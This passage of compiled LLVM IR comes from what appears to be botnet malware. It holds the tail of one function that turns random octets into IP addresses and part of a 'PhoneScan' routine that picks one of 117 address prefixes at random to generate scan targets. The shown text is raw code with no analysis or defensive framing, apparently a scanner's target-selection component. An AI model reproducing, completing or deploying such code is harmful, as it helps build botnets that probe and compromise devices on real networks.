  %969 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %964, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.181, i64 0, i64 0), i32 %966, i32 %968)
  br label %.thread272

; <label>:970:                                    ; preds = %0
  %971 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %972 = load i8, i8* @ipState.2, align 1
  %973 = zext i8 %972 to i32
  %974 = load i8, i8* @ipState.3, align 1
  %975 = zext i8 %974 to i32
  %976 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %971, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.182, i64 0, i64 0), i32 %973, i32 %975)
  br label %.thread272

.thread397:                                       ; preds = %0
  %977 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %978 = load i8, i8* @ipState.2, align 1
  %979 = zext i8 %978 to i32
  %980 = load i8, i8* @ipState.3, align 1
  %981 = zext i8 %980 to i32
  %982 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %977, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.183, i64 0, i64 0), i32 %979, i32 %981)
  br label %.thread272

; <label>:983:                                    ; preds = %0
  %984 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %985 = load i8, i8* @ipState.2, align 1
  %986 = zext i8 %985 to i32
  %987 = load i8, i8* @ipState.3, align 1
  %988 = zext i8 %987 to i32
  %989 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %984, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.184, i64 0, i64 0), i32 %986, i32 %988)
  br label %.thread272

; <label>:990:                                    ; preds = %0
  %991 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %992 = load i8, i8* @ipState.2, align 1
  %993 = zext i8 %992 to i32
  %994 = load i8, i8* @ipState.3, align 1
  %995 = zext i8 %994 to i32
  %996 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %991, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.185, i64 0, i64 0), i32 %993, i32 %995)
  br label %.thread272

; <label>:997:                                    ; preds = %0
  %998 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %999 = load i8, i8* @ipState.2, align 1
  %1000 = zext i8 %999 to i32
  %1001 = load i8, i8* @ipState.3, align 1
  %1002 = zext i8 %1001 to i32
  %1003 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %998, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.186, i64 0, i64 0), i32 %1000, i32 %1002)
  br label %.thread272

.thread272:                                       ; preds = %..thread272_crit_edge, %.critedge, %120, %113, %106, %99, %183, %134, %127, %92, %190, %148, %141, %85, %197, %162, %155, %78, %204, %169, %211, %176, %71, %218, %64, %225, %239, %36, %43, %50, %57, %.thread164, %.thread165, %.thread168, %.thread169, %232, %.thread197, %.thread195, %.thread193, %.thread191, %383, %.thread293, %724, %.thread213, %.thread183, %418, %.thread267, %676, %.thread205, %.thread203, %.thread187, %397, %.thread249, %.thread177, %642, %.thread266, %.thread265, %669, %.thread201, %.thread199, %.thread189, %390, %.thread241, %514, %655, %.thread258, %983, %.thread393, %970, %.thread389, %957, %.thread262, %710, %.thread290, %.thread291, %703, %.thread175, %.thread289, %938, %.thread374, %635, %.thread245, %931, %.thread372, %924, %.thread368, %905, %.thread360, %892, %.thread357, %474, %.thread179, %885, %.thread355, %854, %.thread344, %437, %.thread181, %841, %.thread338, %834, %.thread336, %411, %.thread211, %821, %.thread333, %796, %.thread323, %507, %.thread237, %.thread239, %500, %.thread233, %.thread235, %487, %.thread227, %.thread229, %759, %.thread311, %752, %.thread309, %.thread310, %745, %.thread308, %738, %.thread307, %731, %.thread294, %717, %.thread292, %696, %.thread273, %689, %.thread270, %404, %.thread185, %.thread207, %.thread209, %662, %.thread261, %990, %.thread397, %.thread385, %.thread358, %.thread349, %.thread334, %.thread330, %.thread327, %.thread324, %.thread320, %.thread282, %.thread173, %997
  %.pre-phi = phi i8* [ %.pre, %..thread272_crit_edge ], [ %246, %.critedge ], [ %121, %120 ], [ %114, %113 ], [ %107, %106 ], [ %100, %99 ], [ %184, %183 ], [ %135, %134 ], [ %128, %127 ], [ %93, %92 ], [ %191, %190 ], [ %149, %148 ], [ %142, %141 ], [ %86, %85 ], [ %198, %197 ], [ %163, %162 ], [ %156, %155 ], [ %79, %78 ], [ %205, %204 ], [ %170, %169 ], [ %212, %211 ], [ %177, %176 ], [ %72, %71 ], [ %219, %218 ], [ %65, %64 ], [ %226, %225 ], [ %240, %239 ], [ %37, %36 ], [ %44, %43 ], [ %51, %50 ], [ %58, %57 ], [ %30, %.thread164 ], [ %24, %.thread165 ], [ %18, %.thread168 ], [ %12, %.thread169 ], [ %233, %232 ], [ %329, %.thread197 ], [ %323, %.thread195 ], [ %317, %.thread193 ], [ %311, %.thread191 ], [ %384, %383 ], [ %563, %.thread293 ], [ %725, %724 ], [ %377, %.thread213 ], [ %287, %.thread183 ], [ %419, %418 ], [ %605, %.thread267 ], [ %677, %676 ], [ %353, %.thread205 ], [ %347, %.thread203 ], [ %299, %.thread187 ], [ %398, %397 ], [ %494, %.thread249 ], [ %269, %.thread177 ], [ %643, %642 ], [ %611, %.thread266 ], [ %617, %.thread265 ], [ %670, %669 ], [ %341, %.thread201 ], [ %335, %.thread199 ], [ %305, %.thread189 ], [ %391, %390 ], [ %468, %.thread241 ], [ %515, %514 ], [ %656, %655 ], [ %629, %.thread258 ], [ %984, %983 ], [ %964, %.thread393 ], [ %971, %970 ], [ %951, %.thread389 ], [ %958, %957 ], [ %649, %.thread262 ], [ %711, %710 ], [ %581, %.thread290 ], [ %575, %.thread291 ], [ %704, %703 ], [ %263, %.thread175 ], [ %587, %.thread289 ], [ %939, %938 ], [ %918, %.thread374 ], [ %636, %635 ], [ %481, %.thread245 ], [ %932, %931 ], [ %912, %.thread372 ], [ %925, %924 ], [ %899, %.thread368 ], [ %906, %905 ], [ %879, %.thread360 ], [ %893, %892 ], [ %867, %.thread357 ], [ %475, %474 ], [ %275, %.thread179 ], [ %886, %885 ], [ %861, %.thread355 ], [ %855, %854 ], [ %828, %.thread344 ], [ %438, %437 ], [ %281, %.thread181 ], [ %842, %841 ], [ %815, %.thread338 ], [ %835, %834 ], [ %809, %.thread336 ], [ %412, %411 ], [ %371, %.thread211 ], [ %822, %821 ], [ %790, %.thread333 ], [ %797, %796 ], [ %521, %.thread323 ], [ %508, %507 ], [ %456, %.thread237 ], [ %462, %.thread239 ], [ %501, %500 ], [ %444, %.thread233 ], [ %450, %.thread235 ], [ %488, %487 ], [ %425, %.thread227 ], [ %431, %.thread229 ], [ %760, %759 ], [ %527, %.thread311 ], [ %753, %752 ], [ %539, %.thread309 ], [ %533, %.thread310 ], [ %746, %745 ], [ %545, %.thread308 ], [ %739, %738 ], [ %551, %.thread307 ], [ %732, %731 ], [ %557, %.thread294 ], [ %718, %717 ], [ %569, %.thread292 ], [ %697, %696 ], [ %593, %.thread273 ], [ %690, %689 ], [ %599, %.thread270 ], [ %405, %404 ], [ %293, %.thread185 ], [ %359, %.thread207 ], [ %365, %.thread209 ], [ %663, %662 ], [ %623, %.thread261 ], [ %991, %990 ], [ %977, %.thread397 ], [ %945, %.thread385 ], [ %873, %.thread358 ], [ %848, %.thread349 ], [ %803, %.thread334 ], [ %784, %.thread330 ], [ %778, %.thread327 ], [ %772, %.thread324 ], [ %766, %.thread320 ], [ %683, %.thread282 ], [ %257, %.thread173 ], [ %998, %997 ]
  %1004 = call i32 @inet_addr(i8* nonnull %.pre-phi) #5
  ret i32 %1004
}

; Function Attrs: noinline nounwind uwtable
define i32 @PhoneScan() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  store i8 0, i8* @ipState.2, align 1
  store i8 0, i8* @ipState.3, align 1
  %2 = tail call i32 @rand() #5
  %3 = tail call i32 @rand() #5
  %4 = tail call i32 @rand() #5
  %5 = srem i32 %4, 255
  %6 = trunc i32 %5 to i8
  store i8 %6, i8* @ipState.2, align 1
  %7 = tail call i32 @rand() #5
  %8 = srem i32 %7, 255
  %9 = trunc i32 %8 to i8
  store i8 %9, i8* @ipState.3, align 1
  %10 = tail call i32 @rand() #5
  %11 = srem i32 %10, 117
  switch i32 %11, label %..thread163_crit_edge [
    i32 0, label %216
    i32 1, label %223
    i32 2, label %230
    i32 3, label %237
    i32 4, label %244
    i32 5, label %251
    i32 6, label %258
    i32 7, label %265
    i32 8, label %272
    i32 9, label %279
    i32 10, label %286
    i32 11, label %293
    i32 12, label %300
    i32 13, label %307
    i32 14, label %314
    i32 15, label %321
    i32 16, label %328
    i32 17, label %335
    i32 18, label %342
    i32 19, label %349
    i32 20, label %356
    i32 21, label %363
    i32 22, label %370
    i32 23, label %377
    i32 24, label %384
    i32 25, label %391
    i32 26, label %398
    i32 27, label %.thread128
    i32 28, label %.thread129
    i32 29, label %405
    i32 30, label %.thread132
    i32 31, label %.thread133
    i32 32, label %.thread134
    i32 33, label %.thread135
    i32 34, label %.thread136
    i32 35, label %412
    i32 36, label %.thread139
    i32 37, label %419
    i32 38, label %.thread142
    i32 39, label %426
    i32 40, label %433
    i32 41, label %440
    i32 42, label %447
    i32 43, label %.thread151
    i32 44, label %454
    i32 45, label %.thread154
    i32 46, label %.thread155
    i32 47, label %.thread156
    i32 48, label %.thread157
    i32 49, label %.thread158
    i32 50, label %467
    i32 51, label %.thread161
    i32 52, label %474
    i32 53, label %.thread164
    i32 54, label %481
    i32 55, label %488
    i32 56, label %495
    i32 57, label %.thread177
    i32 58, label %.thread178
    i32 59, label %.thread179
    i32 60, label %.thread180
    i32 61, label %.thread181
    i32 62, label %.thread182
    i32 63, label %502
    i32 64, label %509
    i32 65, label %516
    i32 66, label %523
    i32 67, label %530
    i32 68, label %.thread193
    i32 69, label %.thread196
    i32 70, label %.thread197
    i32 71, label %.thread198
    i32 72, label %.thread199
    i32 73, label %.thread200
    i32 74, label %543
    i32 75, label %550
    i32 76, label %557
    i32 77, label %564
    i32 78, label %.thread209
    i32 79, label %.thread210
    i32 80, label %.thread213
    i32 81, label %.thread214
    i32 82, label %583
    i32 83, label %.thread221
    i32 84, label %590
    i32 85, label %.thread224
    i32 86, label %.thread225
    i32 87, label %603
    i32 88, label %.thread230
    i32 89, label %610
    i32 90, label %.thread235
    i32 91, label %.thread236
    i32 92, label %617
    i32 93, label %.thread239
    i32 94, label %630
    i32 95, label %637
    i32 96, label %.thread246
    i32 97, label %.thread247
    i32 98, label %.thread248
    i32 99, label %.thread249
    i32 100, label %.thread253
    i32 101, label %.thread255
    i32 102, label %.thread257
    i32 103, label %686
    i32 104, label %693
    i32 105, label %700
    i32 106, label %.thread266
    i32 107, label %.thread267
    i32 108, label %.thread271
    i32 109, label %.thread273
    i32 110, label %731
    i32 111, label %738
    i32 112, label %745
    i32 113, label %.thread281
    i32 114, label %.thread282
    i32 115, label %764
    i32 116, label %771
  ]

..thread163_crit_edge:                            ; preds = %0
  %.pre = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  br label %.thread163

.thread236:                                       ; preds = %0
  %12 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %13 = load i8, i8* @ipState.2, align 1
  %14 = zext i8 %13 to i32
  %15 = load i8, i8* @ipState.3, align 1
  %16 = zext i8 %15 to i32
  %17 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %12, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.276, i64 0, i64 0), i32 %14, i32 %16)
  br label %.thread163

.thread235:                                       ; preds = %0
  %18 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %19 = load i8, i8* @ipState.2, align 1
  %20 = zext i8 %19 to i32
  %21 = load i8, i8* @ipState.3, align 1
  %22 = zext i8 %21 to i32
  %23 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %18, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.275, i64 0, i64 0), i32 %20, i32 %22)
  br label %.thread163

.thread230:                                       ; preds = %0
  %24 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %25 = load i8, i8* @ipState.2, align 1
  %26 = zext i8 %25 to i32
  %27 = load i8, i8* @ipState.3, align 1
  %28 = zext i8 %27 to i32
  %29 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %24, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.273, i64 0, i64 0), i32 %26, i32 %28)
  br label %.thread163

.thread224:                                       ; preds = %0
  %30 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %31 = load i8, i8* @ipState.2, align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* @ipState.3, align 1
  %34 = zext i8 %33 to i32
  %35 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %30, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.270, i64 0, i64 0), i32 %32, i32 %34)
  br label %.thread163

.thread221:                                       ; preds = %0
  %36 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %37 = load i8, i8* @ipState.2, align 1
  %38 = zext i8 %37 to i32
  %39 = load i8, i8* @ipState.3, align 1
  %40 = zext i8 %39 to i32
  %41 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %36, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.268, i64 0, i64 0), i32 %38, i32 %40)
  br label %.thread163

.thread213:                                       ; preds = %0
  %42 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %43 = load i8, i8* @ipState.2, align 1
  %44 = zext i8 %43 to i32
  %45 = load i8, i8* @ipState.3, align 1
  %46 = zext i8 %45 to i32
  %47 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %42, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.265, i64 0, i64 0), i32 %44, i32 %46)
  br label %.thread163

.thread209:                                       ; preds = %0
  %48 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %49 = load i8, i8* @ipState.2, align 1
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* @ipState.3, align 1
  %52 = zext i8 %51 to i32
  %53 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %48, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.263, i64 0, i64 0), i32 %50, i32 %52)
  br label %.thread163

.thread200:                                       ; preds = %0
  %54 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %55 = load i8, i8* @ipState.2, align 1
  %56 = zext i8 %55 to i32
  %57 = load i8, i8* @ipState.3, align 1
  %58 = zext i8 %57 to i32
  %59 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %54, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.258, i64 0, i64 0), i32 %56, i32 %58)
  br label %.thread163

.thread199:                                       ; preds = %0
  %60 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %61 = load i8, i8* @ipState.2, align 1
  %62 = zext i8 %61 to i32
  %63 = load i8, i8* @ipState.3, align 1
  %64 = zext i8 %63 to i32
  %65 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %60, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.257, i64 0, i64 0), i32 %62, i32 %64)
  br label %.thread163

.thread198:                                       ; preds = %0
  %66 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %67 = load i8, i8* @ipState.2, align 1
  %68 = zext i8 %67 to i32
  %69 = load i8, i8* @ipState.3, align 1
  %70 = zext i8 %69 to i32
  %71 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %66, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.256, i64 0, i64 0), i32 %68, i32 %70)
  br label %.thread163

.thread197:                                       ; preds = %0
  %72 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %73 = load i8, i8* @ipState.2, align 1
  %74 = zext i8 %73 to i32
  %75 = load i8, i8* @ipState.3, align 1
  %76 = zext i8 %75 to i32
  %77 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %72, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.255, i64 0, i64 0), i32 %74, i32 %76)
  br label %.thread163

.thread196:                                       ; preds = %0
  %78 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %79 = load i8, i8* @ipState.2, align 1
  %80 = zext i8 %79 to i32
  %81 = load i8, i8* @ipState.3, align 1
  %82 = zext i8 %81 to i32
  %83 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %78, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.254, i64 0, i64 0), i32 %80, i32 %82)
  br label %.thread163

.thread182:                                       ; preds = %0
  %84 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %85 = load i8, i8* @ipState.2, align 1
  %86 = zext i8 %85 to i32
  %87 = load i8, i8* @ipState.3, align 1
  %88 = zext i8 %87 to i32
  %89 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %84, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.247, i64 0, i64 0), i32 %86, i32 %88)
  br label %.thread163

.thread181:                                       ; preds = %0
  %90 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %91 = load i8, i8* @ipState.2, align 1
  %92 = zext i8 %91 to i32
  %93 = load i8, i8* @ipState.3, align 1
  %94 = zext i8 %93 to i32
  %95 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %90, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.246, i64 0, i64 0), i32 %92, i32 %94)
  br label %.thread163

.thread180:                                       ; preds = %0
  %96 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %97 = load i8, i8* @ipState.2, align 1
  %98 = zext i8 %97 to i32
  %99 = load i8, i8* @ipState.3, align 1
  %100 = zext i8 %99 to i32
  %101 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %96, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.245, i64 0, i64 0), i32 %98, i32 %100)
  br label %.thread163

.thread179:                                       ; preds = %0
  %102 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %103 = load i8, i8* @ipState.2, align 1
  %104 = zext i8 %103 to i32
  %105 = load i8, i8* @ipState.3, align 1
  %106 = zext i8 %105 to i32
  %107 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %102, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.244, i64 0, i64 0), i32 %104, i32 %106)
  br label %.thread163

.thread178:                                       ; preds = %0
  %108 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %109 = load i8, i8* @ipState.2, align 1
  %110 = zext i8 %109 to i32
  %111 = load i8, i8* @ipState.3, align 1
  %112 = zext i8 %111 to i32
  %113 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %108, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.243, i64 0, i64 0), i32 %110, i32 %112)
  br label %.thread163

.thread177:                                       ; preds = %0
  %114 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %115 = load i8, i8* @ipState.2, align 1
  %116 = zext i8 %115 to i32
  %117 = load i8, i8* @ipState.3, align 1
  %118 = zext i8 %117 to i32
  %119 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %114, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.242, i64 0, i64 0), i32 %116, i32 %118)
  br label %.thread163

.thread164:                                       ; preds = %0
  %120 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %121 = load i8, i8* @ipState.2, align 1
  %122 = zext i8 %121 to i32
  %123 = load i8, i8* @ipState.3, align 1
  %124 = zext i8 %123 to i32
  %125 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %120, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.238, i64 0, i64 0), i32 %122, i32 %124)
  br label %.thread163

.thread161:                                       ; preds = %0
  %126 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %127 = load i8, i8* @ipState.2, align 1
  %128 = zext i8 %127 to i32
  %129 = load i8, i8* @ipState.3, align 1
  %130 = zext i8 %129 to i32
  %131 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %126, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.202, i64 0, i64 0), i32 %128, i32 %130)
  br label %.thread163

.thread158:                                       ; preds = %0
  %132 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %133 = load i8, i8* @ipState.2, align 1
  %134 = zext i8 %133 to i32
  %135 = load i8, i8* @ipState.3, align 1
  %136 = zext i8 %135 to i32
  %137 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %132, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.235, i64 0, i64 0), i32 %134, i32 %136)
  br label %.thread163

.thread157:                                       ; preds = %0
  %138 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %139 = load i8, i8* @ipState.2, align 1
  %140 = zext i8 %139 to i32
  %141 = load i8, i8* @ipState.3, align 1
  %142 = zext i8 %141 to i32
  %143 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %138, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.234, i64 0, i64 0), i32 %140, i32 %142)
  br label %.thread163

.thread156:                                       ; preds = %0
  %144 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %145 = load i8, i8* @ipState.2, align 1
  %146 = zext i8 %145 to i32
  %147 = load i8, i8* @ipState.3, align 1
  %148 = zext i8 %147 to i32
  %149 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %144, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.233, i64 0, i64 0), i32 %146, i32 %148)
  br label %.thread163

.thread154:                                       ; preds = %0
  %150 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %151 = load i8, i8* @ipState.2, align 1
  %152 = zext i8 %151 to i32
  %153 = load i8, i8* @ipState.3, align 1
  %154 = zext i8 %153 to i32
  %155 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %150, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.231, i64 0, i64 0), i32 %152, i32 %154)
  br label %.thread163

.thread151:                                       ; preds = %0
  %156 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %157 = load i8, i8* @ipState.2, align 1
  %158 = zext i8 %157 to i32
  %159 = load i8, i8* @ipState.3, align 1
  %160 = zext i8 %159 to i32
  %161 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %156, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.229, i64 0, i64 0), i32 %158, i32 %160)
  br label %.thread163

.thread142:                                       ; preds = %0
  %162 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %163 = load i8, i8* @ipState.2, align 1
  %164 = zext i8 %163 to i32
  %165 = load i8, i8* @ipState.3, align 1
  %166 = zext i8 %165 to i32
  %167 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %162, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.224, i64 0, i64 0), i32 %164, i32 %166)
  br label %.thread163

.thread139:                                       ; preds = %0
  %168 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %169 = load i8, i8* @ipState.2, align 1
  %170 = zext i8 %169 to i32
  %171 = load i8, i8* @ipState.3, align 1
  %172 = zext i8 %171 to i32
  %173 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %168, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.201, i64 0, i64 0), i32 %170, i32 %172)
  br label %.thread163

.thread136:                                       ; preds = %0
  %174 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %175 = load i8, i8* @ipState.2, align 1
  %176 = zext i8 %175 to i32
  %177 = load i8, i8* @ipState.3, align 1
  %178 = zext i8 %177 to i32
  %179 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %174, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.221, i64 0, i64 0), i32 %176, i32 %178)
  br label %.thread163

.thread135:                                       ; preds = %0
  %180 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %181 = load i8, i8* @ipState.2, align 1
  %182 = zext i8 %181 to i32
  %183 = load i8, i8* @ipState.3, align 1
  %184 = zext i8 %183 to i32
  %185 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %180, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.220, i64 0, i64 0), i32 %182, i32 %184)
  br label %.thread163

.thread134:                                       ; preds = %0
  %186 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %187 = load i8, i8* @ipState.2, align 1
  %188 = zext i8 %187 to i32
  %189 = load i8, i8* @ipState.3, align 1
  %190 = zext i8 %189 to i32
  %191 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %186, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.219, i64 0, i64 0), i32 %188, i32 %190)
  br label %.thread163

.thread133:                                       ; preds = %0
  %192 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %193 = load i8, i8* @ipState.2, align 1
  %194 = zext i8 %193 to i32
  %195 = load i8, i8* @ipState.3, align 1
  %196 = zext i8 %195 to i32
  %197 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %192, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.218, i64 0, i64 0), i32 %194, i32 %196)
  br label %.thread163

.thread132:                                       ; preds = %0
  %198 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %199 = load i8, i8* @ipState.2, align 1
  %200 = zext i8 %199 to i32
  %201 = load i8, i8* @ipState.3, align 1
  %202 = zext i8 %201 to i32
  %203 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %198, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.217, i64 0, i64 0), i32 %200, i32 %202)
  br label %.thread163

.thread129:                                       ; preds = %0
  %204 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %205 = load i8, i8* @ipState.2, align 1
  %206 = zext i8 %205 to i32
  %207 = load i8, i8* @ipState.3, align 1
  %208 = zext i8 %207 to i32
  %209 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %204, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.215, i64 0, i64 0), i32 %206, i32 %208)
  br label %.thread163

.thread128:                                       ; preds = %0
  %210 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %211 = load i8, i8* @ipState.2, align 1
  %212 = zext i8 %211 to i32
  %213 = load i8, i8* @ipState.3, align 1
  %214 = zext i8 %213 to i32
  %215 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %210, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.214, i64 0, i64 0), i32 %212, i32 %214)
  br label %.thread163

; <label>:216:                                    ; preds = %0
  %217 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %218 = load i8, i8* @ipState.2, align 1
  %219 = zext i8 %218 to i32
  %220 = load i8, i8* @ipState.3, align 1
  %221 = zext i8 %220 to i32
  %222 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %217, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.188, i64 0, i64 0), i32 %219, i32 %221)
  br label %.thread163

; <label>:223:                                    ; preds = %0
  %224 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %225 = load i8, i8* @ipState.2, align 1
  %226 = zext i8 %225 to i32
  %227 = load i8, i8* @ipState.3, align 1
  %228 = zext i8 %227 to i32
  %229 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %224, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.189, i64 0, i64 0), i32 %226, i32 %228)
  br label %.thread163

; <label>:230:                                    ; preds = %0
  %231 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %232 = load i8, i8* @ipState.2, align 1
  %233 = zext i8 %232 to i32
  %234 = load i8, i8* @ipState.3, align 1
  %235 = zext i8 %234 to i32
  %236 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %231, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.190, i64 0, i64 0), i32 %233, i32 %235)
  br label %.thread163

; <label>:237:                                    ; preds = %0
  %238 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %239 = load i8, i8* @ipState.2, align 1
  %240 = zext i8 %239 to i32
  %241 = load i8, i8* @ipState.3, align 1
  %242 = zext i8 %241 to i32
  %243 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %238, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.191, i64 0, i64 0), i32 %240, i32 %242)
  br label %.thread163

; <label>:244:                                    ; preds = %0
  %245 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %246 = load i8, i8* @ipState.2, align 1
  %247 = zext i8 %246 to i32
  %248 = load i8, i8* @ipState.3, align 1
  %249 = zext i8 %248 to i32
